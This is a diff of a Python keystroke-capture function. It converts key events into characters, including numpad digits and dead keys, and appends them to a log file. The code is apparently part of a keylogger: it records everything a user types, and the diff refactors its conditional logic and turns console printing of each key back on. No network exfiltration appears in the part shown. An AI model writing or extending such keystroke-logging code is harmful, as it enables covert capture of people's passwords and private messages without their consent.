@@ -41,35 +41,40 @@ def capture(key):
     ch = str(key)
 
     if "Key." in ch:
-        ch = f"[{ch}]"
-    elif "\\x" in ch:
+            ch = f"[{ch}]"
+
+    if "\\x" in ch:
         ch = ""
-    elif ch == "\"\'\"":
-        ch = ch.replace("\"", "")
-    elif ch == "\'\"\'":
-        ch = ch.replace("\'", "")
-    elif ch == "\'\\\\\'":
+
+    li = ["[\'~\']", "[\'`\']", "[\'¨\']", "[\'^\']"]
+    for i in li: 
+        if ch == i:
+            ch = ch.replace("\'", "")
+            ch = ch.replace("[", "")
+            ch = ch.replace("]", "")
+
+    if ch == "\'\\\\\'":
         ch = "\\"
-    elif ch == "[\'~\']" or ch == "[\'`\']":
+
+    if ch == "\'\"\'":#"
         ch = ch.replace("\'", "")
-        ch = ch.replace("[", "")
-        ch = ch.replace("]", "")
-    else:
-        ch = ch.replace("\'", "")
+    if ch == "\"\'\"":#'
+        ch = ch.replace("\"", "")
+    else:ch = ch.replace("\'", "")
 
     if ch == "<96>":ch = "0"
-    elif ch == "<97>": ch = "1"
-    elif ch == "<98>": ch = "2"
-    elif ch == "<99>": ch ="3"
-    elif ch == "<100>": ch = "4"
-    elif ch == "<101>": ch = "5"
-    elif ch == "<102>": ch = "6"
-    elif ch == "<103>": ch = "7"
-    elif ch == "<104>": ch = "8"
-    elif ch == "<105>": ch = "9"
-    elif ch == "<110>": ch = "."
+    if ch == "<97>": ch = "1"
+    if ch == "<98>": ch = "2"
+    if ch == "<99>": ch ="3"
+    if ch == "<100>": ch = "4"
+    if ch == "<101>": ch = "5"
+    if ch == "<102>": ch = "6"
+    if ch == "<103>": ch = "7"
+    if ch == "<104>": ch = "8"
+    if ch == "<105>": ch = "9"
+    if ch == "<110>": ch = "."
 
-    #print(ch)
+    print(ch)
     f = open("log.txt", "a")
     fr = open("log.txt", "r")
     if len(fr.readlines()[-1]) >= 100:
